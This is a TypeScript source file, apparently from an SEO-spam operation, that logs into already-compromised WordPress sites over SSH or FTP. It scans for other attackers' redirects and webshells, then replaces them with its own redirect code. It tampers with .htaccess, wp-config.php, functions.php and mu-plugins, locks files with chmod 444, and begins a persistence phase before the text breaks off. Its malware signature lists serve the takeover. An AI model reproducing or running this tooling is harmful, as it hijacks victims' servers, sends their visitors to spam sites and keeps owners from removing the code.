/**
 * Competitor Redirect Analyzer
 * 
 * Deep analysis of HOW and WHERE competitors placed their redirects on compromised sites.
 * Uses FTP/SSH access to read server-side files and identify exact injection points,
 * then provides targeted overwrite strategies to replace competitor redirects with ours.
 * 
 * Flow:
 * 1. HTTP-level detection (surface: headers, JS, meta refresh)
 * 2. Remote file forensics via FTP/SSH (deep: .htaccess, functions.php, mu-plugins, etc.)
 * 3. Targeted overwrite of each injection point
 * 4. Persistence mechanisms (mu-plugin, chmod, watchdog)
 */

import type { Client as FTPClient } from "basic-ftp";
import type { Client as SSHClient, SFTPWrapper } from "ssh2";

// ─── Types ───

export interface CompetitorAnalysis {
  /** All injection points found */
  injectionPoints: InjectionPoint[];
  /** The competitor's redirect destination URL */
  competitorUrl: string | null;
  /** Summary of what was found */
  summary: string;
  /** Recommended overwrite order (most effective first) */
  overwriteOrder: string[];
}

export interface InjectionPoint {
  /** Type of injection */
  type: InjectionType;
  /** File path on server */
  filePath: string;
  /** The malicious code snippet found */
  codeSnippet: string;
  /** Competitor URL extracted from the code */
  competitorUrl: string | null;
  /** How confident we are this is a competitor injection */
  confidence: "high" | "medium" | "low";
  /** Obfuscation method used */
  obfuscation: "none" | "base64" | "rot13" | "gzinflate" | "hex" | "mixed";
  /** Can we overwrite this file? */
  writable: boolean;
  /** Recommended overwrite strategy */
  strategy: OverwriteStrategy;
}

export type InjectionType =
  | "htaccess_redirect"     // .htaccess RewriteRule/Redirect
  | "php_header_inject"     // PHP header() at top of file
  | "php_eval_backdoor"     // eval(base64_decode(...))
  | "php_include_remote"    // include/require remote URL
  | "mu_plugin_backdoor"    // wp-content/mu-plugins/*.php
  | "functions_php_inject"  // theme functions.php injection
  | "wp_config_inject"      // wp-config.php prepended code
  | "index_php_inject"      // index.php modified
  | "user_ini_prepend"      // .user.ini auto_prepend_file
  | "core_file_modified"    // wp-includes/*.php modified
  | "js_redirect_file"      // standalone .js file with redirect
  | "cron_persistence"      // wp-cron or system cron backdoor
  | "db_option_hijack"      // wp_options siteurl/home modified
  | "unknown";

export type OverwriteStrategy =
  | "replace_file"          // Replace entire file content
  | "clean_and_inject"      // Remove competitor code, add ours
  | "delete_and_create"     // Delete competitor file, create ours
  | "prepend_our_code"      // Add our code before competitor's
  | "chmod_lock"            // Overwrite then chmod 444
  | "skip";                 // Can't overwrite (read-only, etc.)

export interface OverwriteResult {
  injectionPoint: InjectionPoint;
  success: boolean;
  action: string;
  detail: string;
}

export interface AnalyzerCredentials {
  ftp?: { host: string; username: string; password: string; port?: number }[];
  ssh?: { host: string; username: string; password?: string; privateKey?: string; port?: number }[];
}

// ─── Competitor Code Signatures ───

const MALICIOUS_PATTERNS = [
  // Obfuscated PHP execution
  { regex: /eval\s*\(\s*base64_decode\s*\(/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "base64" as const, confidence: "high" as const },
  { regex: /eval\s*\(\s*str_rot13\s*\(/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "rot13" as const, confidence: "high" as const },
  { regex: /eval\s*\(\s*gzinflate\s*\(/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "gzinflate" as const, confidence: "high" as const },
  { regex: /eval\s*\(\s*gzuncompress\s*\(/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "gzinflate" as const, confidence: "high" as const },
  { regex: /\$[a-z_]+\s*=\s*"\\x[0-9a-f]+/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "hex" as const, confidence: "medium" as const },
  { regex: /preg_replace\s*\(\s*['"]\/.*?\/e['"]/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "mixed" as const, confidence: "high" as const },
  { regex: /assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },
  { regex: /create_function\s*\(\s*['"]['"]\s*,/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },

  // Remote includes
  { regex: /(?:include|require)(?:_once)?\s*\(\s*['"]https?:\/\//g, type: "php_include_remote" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },
  { regex: /file_get_contents\s*\(\s*['"]https?:\/\/(?!api\.(wordpress|google|facebook))/g, type: "php_include_remote" as InjectionType, obfuscation: "none" as const, confidence: "medium" as const },

  // Direct redirects
  { regex: /header\s*\(\s*['"]Location:\s*https?:\/\/(?!.*(?:wordpress\.org|google\.com))/g, type: "php_header_inject" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },
  { regex: /wp_redirect\s*\(\s*['"]https?:\/\/(?!.*(?:wordpress\.org|google\.com))/g, type: "php_header_inject" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },

  // Webshell indicators
  { regex: /\$_(GET|POST|REQUEST)\s*\[\s*['"](?:cmd|exec|shell|c|command|action|do|x)['"]\s*\]/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },
  { regex: /(?:system|exec|passthru|shell_exec|popen)\s*\(\s*\$_(GET|POST|REQUEST)/g, type: "php_eval_backdoor" as InjectionType, obfuscation: "none" as const, confidence: "high" as const },

  // Gambling/SEO spam keywords in PHP
  { regex: /(?:สล็อต|คาสิโน|หวย|บาคาร่า|แทงบอล|เครดิตฟรี|slot|casino|baccarat)/g, type: "php_header_inject" as InjectionType, obfuscation: "none" as const, confidence: "medium" as const },
];

const HTACCESS_MALICIOUS_PATTERNS = [
  { regex: /RewriteRule\s+.*?\s+https?:\/\/(?!.*(?:wordpress\.org|google\.com))[^\s\]]+/g, confidence: "high" as const },
  { regex: /Redirect(?:Match)?\s+\d*\s*.*?https?:\/\/[^\s]+/g, confidence: "high" as const },
  { regex: /ErrorDocument\s+\d+\s+https?:\/\/[^\s]+/g, confidence: "medium" as const },
  { regex: /php_value\s+auto_prepend_file/g, confidence: "high" as const },
];

const USER_INI_PATTERNS = [
  { regex: /auto_prepend_file\s*=\s*(.+)/g, confidence: "high" as const },
  { regex: /auto_append_file\s*=\s*(.+)/g, confidence: "medium" as const },
];

// ─── Key Files to Inspect ───

const WP_CRITICAL_FILES = [
  ".htaccess",
  "index.php",
  "wp-config.php",
  "wp-settings.php",
  "wp-blog-header.php",
  "wp-load.php",
  "wp-includes/version.php",
  ".user.ini",
  "php.ini",
];

const WP_THEME_FILES = [
  "functions.php",
  "header.php",
  "footer.php",
  "index.php",
];

const WP_MU_PLUGIN_DIR = "wp-content/mu-plugins";

// ═══════════════════════════════════════════════════════
//  PHASE 1: DEEP FILE FORENSICS
// ═══════════════════════════════════════════════════════

/**
 * Analyze a compromised site's files via FTP/SSH to find ALL competitor injection points.
 * This goes much deeper than HTTP-level detection.
 */
export async function analyzeCompetitorRedirects(
  targetDomain: string,
  credentials: AnalyzerCredentials,
  onProgress?: (msg: string) => void,
): Promise<CompetitorAnalysis> {
  const progress = onProgress || (() => {});
  const injectionPoints: InjectionPoint[] = [];
  let competitorUrl: string | null = null;

  progress("🔍 Starting deep competitor redirect analysis...");

  // Try SSH first (more capable), then FTP
  let connected = false;

  if (credentials.ssh && credentials.ssh.length > 0) {
    for (const cred of credentials.ssh) {
      try {
        progress(`🔐 Connecting SSH: ${cred.username}@${cred.host}:${cred.port || 22}...`);
        const results = await analyzeViaSSH(cred, targetDomain, progress);
        injectionPoints.push(...results);
        connected = true;
        break;
      } catch (e: any) {
        progress(`⚠️ SSH ${cred.username}@${cred.host} failed: ${e.message}`);
      }
    }
  }

  if (!connected && credentials.ftp && credentials.ftp.length > 0) {
    for (const cred of credentials.ftp) {
      try {
        progress(`📂 Connecting FTP: ${cred.username}@${cred.host}:${cred.port || 21}...`);
        const results = await analyzeViaFTP(cred, targetDomain, progress);
        injectionPoints.push(...results);
        connected = true;
        break;
      } catch (e: any) {
        progress(`⚠️ FTP ${cred.username}@${cred.host} failed: ${e.message}`);
      }
    }
  }

  if (!connected) {
    return {
      injectionPoints: [],
      competitorUrl: null,
      summary: "Could not connect via SSH or FTP — no deep analysis possible",
      overwriteOrder: [],
    };
  }

  // Extract competitor URL from injection points
  for (const ip of injectionPoints) {
    if (ip.competitorUrl && !competitorUrl) {
      competitorUrl = ip.competitorUrl;
      break;
    }
  }

  // Determine overwrite order (most effective first)
  const overwriteOrder = determineOverwriteOrder(injectionPoints);

  const summary = injectionPoints.length > 0
    ? `Found ${injectionPoints.length} injection point(s). Competitor URL: ${competitorUrl || "unknown"}. ` +
      `Types: ${Array.from(new Set(injectionPoints.map(ip => ip.type))).join(", ")}. ` +
      `Writable: ${injectionPoints.filter(ip => ip.writable).length}/${injectionPoints.length}`
    : "No competitor injection points found in server files";

  progress(`📊 Analysis complete: ${summary}`);

  return {
    injectionPoints,
    competitorUrl,
    summary,
    overwriteOrder,
  };
}

// ─── SSH Analysis ───

async function analyzeViaSSH(
  cred: { host: string; username: string; password?: string; privateKey?: string; port?: number },
  targetDomain: string,
  progress: (msg: string) => void,
): Promise<InjectionPoint[]> {
  const { Client } = await import("ssh2");
  const client = new Client();
  const injectionPoints: InjectionPoint[] = [];

  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      client.end();
      reject(new Error("SSH analysis timeout (60s)"));
    }, 60000);

    client.on("ready", async () => {
      try {
        progress("✅ SSH connected — starting file forensics...");

        // Step 1: Find web root
        const webRoot = await sshFindWebRoot(client, targetDomain, progress);
        if (!webRoot) {
          clearTimeout(timeout);
          client.end();
          resolve([]);
          return;
        }
        progress(`📁 Web root: ${webRoot}`);

        // Step 2: Check critical files
        for (const file of WP_CRITICAL_FILES) {
          const filePath = `${webRoot}/${file}`;
          try {
            const content = await sshReadFile(client, filePath);
            if (content) {
              const points = analyzeFileContent(filePath, content, file);
              injectionPoints.push(...points);
              if (points.length > 0) {
                progress(`🎯 Found ${points.length} injection(s) in ${file}`);
              }
            }
          } catch { /* file doesn't exist or can't read */ }
        }

        // Step 3: Check theme files
        const activeTheme = await sshExec(client, `ls -1 ${webRoot}/wp-content/themes/ 2>/dev/null | head -3`);
        if (activeTheme) {
          const themes = activeTheme.trim().split("\n").filter(Boolean);
          for (const theme of themes) {
            for (const file of WP_THEME_FILES) {
              const filePath = `${webRoot}/wp-content/themes/${theme}/${file}`;
              try {
                const content = await sshReadFile(client, filePath);
                if (content) {
                  const points = analyzeFileContent(filePath, content, `themes/${theme}/${file}`);
                  injectionPoints.push(...points);
                  if (points.length > 0) {
                    progress(`🎯 Found ${points.length} injection(s) in themes/${theme}/${file}`);
                  }
                }
              } catch { /* skip */ }
            }
          }
        }

        // Step 4: Check mu-plugins directory
        const muPlugins = await sshExec(client, `ls -1 ${webRoot}/${WP_MU_PLUGIN_DIR}/ 2>/dev/null`);
        if (muPlugins) {
          const files = muPlugins.trim().split("\n").filter(f => f.endsWith(".php"));
          for (const file of files) {
            const filePath = `${webRoot}/${WP_MU_PLUGIN_DIR}/${file}`;
            try {
              const content = await sshReadFile(client, filePath);
              if (content) {
                const points = analyzeFileContent(filePath, content, `mu-plugins/${file}`);
                // mu-plugins are always suspicious
                for (const p of points) {
                  p.confidence = "high";
                }
                injectionPoints.push(...points);
                if (points.length > 0) {
                  progress(`🎯 Found ${points.length} injection(s) in mu-plugins/${file}`);
                }
              }
            } catch { /* skip */ }
          }
        }

        // Step 5: Check for suspicious recently modified files
        const recentFiles = await sshExec(client, 
          `find ${webRoot} -name "*.php" -newer ${webRoot}/wp-includes/version.php -not -path "*/cache/*" -not -path "*/uploads/*" 2>/dev/null | head -20`
        );
        if (recentFiles) {
          const files = recentFiles.trim().split("\n").filter(Boolean);
          progress(`🔍 Checking ${files.length} recently modified PHP files...`);
          for (const filePath of files) {
            // Skip files we already checked
            if (injectionPoints.some(ip => ip.filePath === filePath)) continue;
            try {
              const content = await sshReadFile(client, filePath);
              if (content) {
                const relPath = filePath.replace(webRoot + "/", "");
                const points = analyzeFileContent(filePath, content, relPath);
                injectionPoints.push(...points);
              }
            } catch { /* skip */ }
          }
        }

        // Step 6: Check writability of each injection point
        for (const ip of injectionPoints) {
          try {
            const writable = await sshExec(client, `test -w "${ip.filePath}" && echo "writable" || echo "readonly"`);
            ip.writable = writable?.trim() === "writable";
          } catch {
            ip.writable = false;
          }
        }

        clearTimeout(timeout);
        client.end();
        resolve(injectionPoints);
      } catch (e) {
        clearTimeout(timeout);
        client.end();
        reject(e);
      }
    });

    client.on("error", (err) => {
      clearTimeout(timeout);
      reject(err);
    });

    const connectOpts: any = {
      host: cred.host,
      port: cred.port || 22,
      username: cred.username,
      readyTimeout: 15000,
    };
    if (cred.privateKey) {
      connectOpts.privateKey = cred.privateKey;
    } else if (cred.password) {
      connectOpts.password = cred.password;
    }
    client.connect(connectOpts);
  });
}

// ─── FTP Analysis ───

async function analyzeViaFTP(
  cred: { host: string; username: string; password: string; port?: number },
  targetDomain: string,
  progress: (msg: string) => void,
): Promise<InjectionPoint[]> {
  const { Client } = await import("basic-ftp");
  const client = new Client();
  client.ftp.verbose = false;
  const injectionPoints: InjectionPoint[] = [];

  try {
    // Try FTPS first, then plain FTP
    try {
      await client.access({
        host: cred.host,
        port: cred.port || 21,
        user: cred.username,
        password: cred.password,
        secure: true,
        secureOptions: { rejectUnauthorized: false },
      });
    } catch {
      await client.access({
        host: cred.host,
        port: cred.port || 21,
        user: cred.username,
        password: cred.password,
        secure: false,
      });
    }

    progress("✅ FTP connected — starting file forensics...");

    // Find web root
    const webRoot = await ftpFindWebRoot(client, targetDomain, progress);
    if (!webRoot) {
      client.close();
      return [];
    }
    progress(`📁 Web root: ${webRoot}`);

    // Check critical files
    for (const file of WP_CRITICAL_FILES) {
      const filePath = `${webRoot}/${file}`;
      try {
        const content = await ftpReadFile(client, filePath);
        if (content) {
          const points = analyzeFileContent(filePath, content, file);
          // FTP files are generally writable
          for (const p of points) p.writable = true;
          injectionPoints.push(...points);
          if (points.length > 0) {
            progress(`🎯 Found ${points.length} injection(s) in ${file}`);
          }
        }
      } catch { /* skip */ }
    }

    // Check theme files
    try {
      const themeDir = `${webRoot}/wp-content/themes`;
      const themes = await client.list(themeDir);
      const themeDirs = themes.filter(f => f.isDirectory).slice(0, 3);
      for (const theme of themeDirs) {
        for (const file of WP_THEME_FILES) {
          const filePath = `${themeDir}/${theme.name}/${file}`;
          try {
            const content = await ftpReadFile(client, filePath);
            if (content) {
              const points = analyzeFileContent(filePath, content, `themes/${theme.name}/${file}`);
              for (const p of points) p.writable = true;
              injectionPoints.push(...points);
              if (points.length > 0) {
                progress(`🎯 Found ${points.length} injection(s) in themes/${theme.name}/${file}`);
              }
            }
          } catch { /* skip */ }
        }
      }
    } catch { /* no themes dir */ }

    // Check mu-plugins
    try {
      const muDir = `${webRoot}/${WP_MU_PLUGIN_DIR}`;
      const muFiles = await client.list(muDir);
      const phpFiles = muFiles.filter(f => f.name.endsWith(".php"));
      for (const file of phpFiles) {
        const filePath = `${muDir}/${file.name}`;
        try {
          const content = await ftpReadFile(client, filePath);
          if (content) {
            const points = analyzeFileContent(filePath, content, `mu-plugins/${file.name}`);
            for (const p of points) {
              p.writable = true;
              p.confidence = "high";
            }
            injectionPoints.push(...points);
            if (points.length > 0) {
              progress(`🎯 Found ${points.length} injection(s) in mu-plugins/${file.name}`);
            }
          }
        } catch { /* skip */ }
      }
    } catch { /* no mu-plugins dir */ }

    client.close();
    return injectionPoints;
  } catch (e) {
    try { client.close(); } catch { /* ignore */ }
    throw e;
  }
}

// ═══════════════════════════════════════════════════════
//  FILE CONTENT ANALYSIS
// ═══════════════════════════════════════════════════════

/**
 * Analyze a file's content for malicious injection patterns.
 * Returns all injection points found in the file.
 */
function analyzeFileContent(filePath: string, content: string, relPath: string): InjectionPoint[] {
  const points: InjectionPoint[] = [];
  const isHtaccess = relPath === ".htaccess";
  const isUserIni = relPath === ".user.ini" || relPath === "php.ini";

  if (isHtaccess) {
    // Check .htaccess-specific patterns
    for (const pattern of HTACCESS_MALICIOUS_PATTERNS) {
      let match: RegExpExecArray | null;
      const regex = new RegExp(pattern.regex.source, pattern.regex.flags);
      while ((match = regex.exec(content)) !== null) {
        const competitorUrl = extractUrl(match[0]);
        points.push({
          type: "htaccess_redirect",
          filePath,
          codeSnippet: match[0].slice(0, 300),
          competitorUrl,
          confidence: pattern.confidence,
          obfuscation: "none",
          writable: false,
          strategy: "replace_file",
        });
      }
    }
    return points;
  }

  if (isUserIni) {
    for (const pattern of USER_INI_PATTERNS) {
      let match: RegExpExecArray | null;
      const regex = new RegExp(pattern.regex.source, pattern.regex.flags);
      while ((match = regex.exec(content)) !== null) {
        points.push({
          type: "user_ini_prepend",
          filePath,
          codeSnippet: match[0].slice(0, 300),
          competitorUrl: null,
          confidence: pattern.confidence,
          obfuscation: "none",
          writable: false,
          strategy: "replace_file",
        });
      }
    }
    return points;
  }

  // Check PHP files
  for (const pattern of MALICIOUS_PATTERNS) {
    let match: RegExpExecArray | null;
    const regex = new RegExp(pattern.regex.source, pattern.regex.flags);
    while ((match = regex.exec(content)) !== null) {
      const competitorUrl = extractUrl(match[0]) || extractUrl(content.slice(Math.max(0, match.index - 200), match.index + 500));
      
      // Determine injection type based on file location
      let type = pattern.type;
      if (relPath.includes("mu-plugins")) type = "mu_plugin_backdoor";
      else if (relPath.includes("functions.php")) type = "functions_php_inject";
      else if (relPath === "wp-config.php") type = "wp_config_inject";
      else if (relPath === "index.php") type = "index_php_inject";
      else if (relPath.includes("wp-includes/")) type = "core_file_modified";

      // Determine strategy
      let strategy: OverwriteStrategy = "clean_and_inject";
      if (type === "mu_plugin_backdoor") strategy = "delete_and_create";
      else if (type === "htaccess_redirect") strategy = "replace_file";
      else if (type === "index_php_inject") strategy = "clean_and_inject";
      else if (type === "wp_config_inject") strategy = "clean_and_inject";

      points.push({
        type,
        filePath,
        codeSnippet: content.slice(Math.max(0, match.index - 50), match.index + 250).slice(0, 300),
        competitorUrl,
        confidence: pattern.confidence,
        obfuscation: pattern.obfuscation,
        writable: false,
        strategy,
      });
    }
  }

  // Check for suspicious first-line injection (code prepended to file)
  const firstLine = content.split("\n")[0];
  if (firstLine && firstLine.length > 200 && (firstLine.includes("eval") || firstLine.includes("base64") || firstLine.includes("gzinflate"))) {
    const competitorUrl = extractUrl(content.slice(0, 1000));
    let type: InjectionType = "php_eval_backdoor";
    if (relPath === "index.php") type = "index_php_inject";
    else if (relPath === "wp-config.php") type = "wp_config_inject";
    else if (relPath.includes("functions.php")) type = "functions_php_inject";

    // Avoid duplicates
    if (!points.some(p => p.filePath === filePath && p.type === type)) {
      points.push({
        type,
        filePath,
        codeSnippet: firstLine.slice(0, 300),
        competitorUrl,
        confidence: "high",
        obfuscation: "mixed",
        writable: false,
        strategy: "clean_and_inject",
      });
    }
  }

  return points;
}

// ═══════════════════════════════════════════════════════
//  PHASE 2: TARGETED OVERWRITE
// ═══════════════════════════════════════════════════════

/**
 * Overwrite ALL competitor injection points with our redirect code.
 * Uses FTP/SSH to directly modify files on the server.
 */
export async function overwriteCompetitorRedirects(
  analysis: CompetitorAnalysis,
  ourRedirectUrl: string,
  credentials: AnalyzerCredentials,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult[]> {
  const progress = onProgress || (() => {});
  const results: OverwriteResult[] = [];

  if (analysis.injectionPoints.length === 0) {
    progress("ℹ️ No injection points to overwrite");
    return [];
  }

  const writablePoints = analysis.injectionPoints.filter(ip => ip.writable);
  progress(`🎯 Overwriting ${writablePoints.length}/${analysis.injectionPoints.length} writable injection points...`);

  // Try SSH first
  if (credentials.ssh && credentials.ssh.length > 0) {
    for (const cred of credentials.ssh) {
      try {
        progress(`🔐 Connecting SSH for overwrite: ${cred.username}@${cred.host}...`);
        const sshResults = await overwriteViaSSH(cred, analysis, ourRedirectUrl, targetDomain, seoKeywords, progress);
        results.push(...sshResults);
        if (sshResults.some(r => r.success)) return results;
      } catch (e: any) {
        progress(`⚠️ SSH overwrite failed: ${e.message}`);
      }
    }
  }

  // Fallback to FTP
  if (credentials.ftp && credentials.ftp.length > 0) {
    for (const cred of credentials.ftp) {
      try {
        progress(`📂 Connecting FTP for overwrite: ${cred.username}@${cred.host}...`);
        const ftpResults = await overwriteViaFTP(cred, analysis, ourRedirectUrl, targetDomain, seoKeywords, progress);
        results.push(...ftpResults);
        if (ftpResults.some(r => r.success)) return results;
      } catch (e: any) {
        progress(`⚠️ FTP overwrite failed: ${e.message}`);
      }
    }
  }

  return results;
}

// ─── SSH Overwrite ───

async function overwriteViaSSH(
  cred: { host: string; username: string; password?: string; privateKey?: string; port?: number },
  analysis: CompetitorAnalysis,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult[]> {
  const { Client } = await import("ssh2");
  const client = new Client();
  const results: OverwriteResult[] = [];
  const progress = onProgress || (() => {});

  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      client.end();
      reject(new Error("SSH overwrite timeout (90s)"));
    }, 90000);

    client.on("ready", async () => {
      try {
        // Process injection points in recommended order
        for (const type of analysis.overwriteOrder) {
          const points = analysis.injectionPoints.filter(ip => ip.type === type && ip.writable);
          for (const ip of points) {
            const result = await overwriteSinglePointSSH(client, ip, ourRedirectUrl, targetDomain, seoKeywords, progress);
            results.push(result);
          }
        }

        // Also create persistence mechanisms
        const webRoot = analysis.injectionPoints[0]?.filePath.match(/^(.*?)\/(?:wp-|index|\.ht)/)?.[1];
        if (webRoot) {
          const persistResult = await createPersistenceSSH(client, webRoot, ourRedirectUrl, targetDomain, seoKeywords, progress);
          results.push(...persistResult);
        }

        clearTimeout(timeout);
        client.end();
        resolve(results);
      } catch (e) {
        clearTimeout(timeout);
        client.end();
        reject(e);
      }
    });

    client.on("error", (err) => {
      clearTimeout(timeout);
      reject(err);
    });

    const connectOpts: any = {
      host: cred.host,
      port: cred.port || 22,
      username: cred.username,
      readyTimeout: 15000,
    };
    if (cred.privateKey) connectOpts.privateKey = cred.privateKey;
    else if (cred.password) connectOpts.password = cred.password;
    client.connect(connectOpts);
  });
}

async function overwriteSinglePointSSH(
  client: SSHClient,
  ip: InjectionPoint,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult> {
  const progress = onProgress || (() => {});

  try {
    switch (ip.strategy) {
      case "replace_file": {
        // Generate replacement content based on file type
        const newContent = generateReplacementContent(ip, ourRedirectUrl, targetDomain, seoKeywords);
        // Backup original, then replace
        await sshExec(client, `cp "${ip.filePath}" "${ip.filePath}.bak.${Date.now()}" 2>/dev/null`);
        await sshWriteFile(client, ip.filePath, newContent);
        progress(`✅ Replaced ${ip.filePath} (was: ${ip.type})`);
        return { injectionPoint: ip, success: true, action: "replace_file", detail: `Replaced ${ip.filePath} with our redirect` };
      }

      case "clean_and_inject": {
        // Read current content, remove competitor code, add ours
        const currentContent = await sshReadFile(client, ip.filePath);
        if (!currentContent) {
          return { injectionPoint: ip, success: false, action: "clean_and_inject", detail: `Could not read ${ip.filePath}` };
        }
        const cleanedContent = removeCompetitorCode(currentContent, ip);
        const injectedContent = injectOurCode(cleanedContent, ip, ourRedirectUrl, targetDomain, seoKeywords);
        await sshExec(client, `cp "${ip.filePath}" "${ip.filePath}.bak.${Date.now()}" 2>/dev/null`);
        await sshWriteFile(client, ip.filePath, injectedContent);
        progress(`✅ Cleaned + injected ${ip.filePath} (was: ${ip.type})`);
        return { injectionPoint: ip, success: true, action: "clean_and_inject", detail: `Cleaned competitor code and injected ours in ${ip.filePath}` };
      }

      case "delete_and_create": {
        // Delete competitor file, create our own
        await sshExec(client, `rm -f "${ip.filePath}" 2>/dev/null`);
        const ourContent = generateMuPluginContent(ourRedirectUrl, targetDomain, seoKeywords);
        await sshWriteFile(client, ip.filePath, ourContent);
        progress(`✅ Deleted + recreated ${ip.filePath}`);
        return { injectionPoint: ip, success: true, action: "delete_and_create", detail: `Deleted competitor mu-plugin and created ours at ${ip.filePath}` };
      }

      case "prepend_our_code": {
        const currentContent = await sshReadFile(client, ip.filePath);
        if (!currentContent) {
          return { injectionPoint: ip, success: false, action: "prepend_our_code", detail: `Could not read ${ip.filePath}` };
        }
        const ourCode = generatePhpRedirectSnippet(ourRedirectUrl, targetDomain);
        const newContent = currentContent.startsWith("<?php")
          ? currentContent.replace("<?php", `<?php\n${ourCode}\n`)
          : `<?php\n${ourCode}\n?>\n${currentContent}`;
        await sshWriteFile(client, ip.filePath, newContent);
        progress(`✅ Prepended our code to ${ip.filePath}`);
        return { injectionPoint: ip, success: true, action: "prepend_our_code", detail: `Prepended our redirect code to ${ip.filePath}` };
      }

      case "chmod_lock": {
        const newContent = generateReplacementContent(ip, ourRedirectUrl, targetDomain, seoKeywords);
        await sshWriteFile(client, ip.filePath, newContent);
        await sshExec(client, `chmod 444 "${ip.filePath}" 2>/dev/null`);
        progress(`✅ Replaced + locked ${ip.filePath} (chmod 444)`);
        return { injectionPoint: ip, success: true, action: "chmod_lock", detail: `Replaced and locked ${ip.filePath}` };
      }

      default:
        return { injectionPoint: ip, success: false, action: "skip", detail: `Skipped ${ip.filePath} — no strategy available` };
    }
  } catch (e: any) {
    return { injectionPoint: ip, success: false, action: ip.strategy, detail: `Error: ${e.message}` };
  }
}

// ─── FTP Overwrite ───

async function overwriteViaFTP(
  cred: { host: string; username: string; password: string; port?: number },
  analysis: CompetitorAnalysis,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult[]> {
  const { Client } = await import("basic-ftp");
  const client = new Client();
  const results: OverwriteResult[] = [];
  const progress = onProgress || (() => {});

  try {
    try {
      await client.access({
        host: cred.host, port: cred.port || 21,
        user: cred.username, password: cred.password,
        secure: true, secureOptions: { rejectUnauthorized: false },
      });
    } catch {
      await client.access({
        host: cred.host, port: cred.port || 21,
        user: cred.username, password: cred.password,
        secure: false,
      });
    }

    for (const type of analysis.overwriteOrder) {
      const points = analysis.injectionPoints.filter(ip => ip.type === type && ip.writable);
      for (const ip of points) {
        try {
          const result = await overwriteSinglePointFTP(client, ip, ourRedirectUrl, targetDomain, seoKeywords, progress);
          results.push(result);
        } catch (e: any) {
          results.push({ injectionPoint: ip, success: false, action: ip.strategy, detail: `FTP error: ${e.message}` });
        }
      }
    }

    // Create persistence
    const webRoot = analysis.injectionPoints[0]?.filePath.match(/^(.*?)\/(?:wp-|index|\.ht)/)?.[1];
    if (webRoot) {
      const persistResult = await createPersistenceFTP(client, webRoot, ourRedirectUrl, targetDomain, seoKeywords, progress);
      results.push(...persistResult);
    }

    client.close();
    return results;
  } catch (e) {
    try { client.close(); } catch { /* ignore */ }
    throw e;
  }
}

async function overwriteSinglePointFTP(
  client: FTPClient,
  ip: InjectionPoint,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult> {
  const progress = onProgress || (() => {});
  const { Readable } = await import("stream");

  try {
    switch (ip.strategy) {
      case "replace_file":
      case "chmod_lock": {
        const newContent = generateReplacementContent(ip, ourRedirectUrl, targetDomain, seoKeywords);
        await client.uploadFrom(Readable.from(Buffer.from(newContent, "utf-8")), ip.filePath);
        progress(`✅ Replaced ${ip.filePath} via FTP`);
        return { injectionPoint: ip, success: true, action: "replace_file", detail: `Replaced ${ip.filePath}` };
      }

      case "clean_and_inject": {
        const currentContent = await ftpReadFile(client, ip.filePath);
        if (!currentContent) {
          return { injectionPoint: ip, success: false, action: "clean_and_inject", detail: `Could not read ${ip.filePath}` };
        }
        const cleanedContent = removeCompetitorCode(currentContent, ip);
        const injectedContent = injectOurCode(cleanedContent, ip, ourRedirectUrl, targetDomain, seoKeywords);
        await client.uploadFrom(Readable.from(Buffer.from(injectedContent, "utf-8")), ip.filePath);
        progress(`✅ Cleaned + injected ${ip.filePath} via FTP`);
        return { injectionPoint: ip, success: true, action: "clean_and_inject", detail: `Cleaned and injected ${ip.filePath}` };
      }

      case "delete_and_create": {
        try { await client.remove(ip.filePath); } catch { /* may not exist */ }
        const ourContent = generateMuPluginContent(ourRedirectUrl, targetDomain, seoKeywords);
        await client.uploadFrom(Readable.from(Buffer.from(ourContent, "utf-8")), ip.filePath);
        progress(`✅ Deleted + recreated ${ip.filePath} via FTP`);
        return { injectionPoint: ip, success: true, action: "delete_and_create", detail: `Recreated ${ip.filePath}` };
      }

      case "prepend_our_code": {
        const currentContent = await ftpReadFile(client, ip.filePath);
        if (!currentContent) {
          return { injectionPoint: ip, success: false, action: "prepend_our_code", detail: `Could not read ${ip.filePath}` };
        }
        const ourCode = generatePhpRedirectSnippet(ourRedirectUrl, targetDomain);
        const newContent = currentContent.startsWith("<?php")
          ? currentContent.replace("<?php", `<?php\n${ourCode}\n`)
          : `<?php\n${ourCode}\n?>\n${currentContent}`;
        await client.uploadFrom(Readable.from(Buffer.from(newContent, "utf-8")), ip.filePath);
        progress(`✅ Prepended our code to ${ip.filePath} via FTP`);
        return { injectionPoint: ip, success: true, action: "prepend_our_code", detail: `Prepended code to ${ip.filePath}` };
      }

      default:
        return { injectionPoint: ip, success: false, action: "skip", detail: `Skipped ${ip.filePath}` };
    }
  } catch (e: any) {
    return { injectionPoint: ip, success: false, action: ip.strategy, detail: `FTP error: ${e.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  PHASE 3: PERSISTENCE MECHANISMS
// ═══════════════════════════════════════════════════════

async function createPersistenceSSH(
  client: SSHClient,
  webRoot: string,
  ourRedirectUrl: string,
  targetDomain: string,
  seoKeywords?: string[],
  onProgress?: (msg: string) => void,
): Promise<OverwriteResult[]> {
  const progress = onProgress || (() => {});
  const results: OverwriteResult[] = [];

